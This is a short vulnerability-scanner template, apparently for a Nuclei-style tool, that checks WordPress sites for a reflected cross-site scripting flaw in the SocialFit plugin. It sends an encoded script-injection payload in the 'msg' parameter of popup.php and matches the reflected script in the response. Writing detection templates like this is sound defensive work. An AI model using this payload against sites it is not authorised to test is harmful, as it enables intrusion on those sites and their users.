id: wp-socialfit-xss
name: WordPress SocialFit - Cross-Site Scripting
severity: high
confidence: confirmed
description: WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it
  fails to properly sanitize user-supplied input.
reference: CWE-79
tags:
- wordpress
- wp
- xss
- wp-plugin
- edb
- vuln
requests:
- method: GET
  path: /wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers:
  - type: body
    words:
    - </script><script>alert(document.domain)</script>
  - type: body
    words:
    - <title>Google+
    - window.___gcfg
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
